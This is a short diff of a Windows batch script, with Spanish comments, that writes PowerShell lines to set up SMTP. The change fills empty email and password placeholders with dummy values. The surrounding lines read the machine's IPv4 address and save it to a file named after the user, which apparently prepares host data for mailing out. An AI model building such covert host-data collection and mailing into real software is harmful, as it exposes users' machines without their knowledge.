@@ -38,8 +38,8 @@ if '%errorlevel%' NEQ '0' (
 
 @REM Estableciendo SMTP
 (
-	echo $Email = ""
-	echo $Password =
+	echo $Email = "asd"
+	echo $Password = "123"
 
 	echo $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress 
 	echo echo "ip:$ip" > "$env:UserName.txt"
